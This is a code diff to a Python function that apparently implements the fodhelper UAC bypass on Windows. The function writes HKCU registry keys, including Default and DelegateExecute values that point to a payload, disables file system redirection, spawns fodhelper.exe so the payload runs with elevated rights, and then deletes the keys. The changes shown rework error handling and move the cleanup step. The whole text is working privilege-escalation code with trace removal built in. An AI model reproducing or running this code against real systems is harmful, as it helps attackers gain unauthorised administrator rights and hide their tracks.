@@ -19,6 +19,7 @@ def fodhelper_cleanup(path):
 	print_info("Performing cleaning")
 	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
 		print_success("Successfully cleaned up")
+		print_success("All done!")	
 	else:
 		print_error("Unable to cleanup")
 		return False
@@ -32,11 +33,13 @@ def fodhelper(payload):
 				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payload)))
 			else:
 				print_error("Unable to create registry keys")
-				if "error" in Constant.output:
-					fodhelper_cleanup(path)
+				for x in Constant.output:
+					if "error" in x:
+						fodhelper_cleanup(path)
+						return False
 		else:
 			print_error("Unable to create registry keys")
-			return False		
+			return False
 
 		time.sleep(5)
 
@@ -45,15 +48,14 @@ def fodhelper(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create("fodhelper.exe"):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
+				time.sleep(5)
+				fodhelper_cleanup(path)
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				if "error" in Constant.output:
-					fodhelper_cleanup(path)
-
-		time.sleep(5)
-		
-		if not fodhelper_cleanup(path):
-			print_success("All done!")
+				for x in Constant.output:
+					if "error" in x:
+						fodhelper_cleanup(path)
+						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
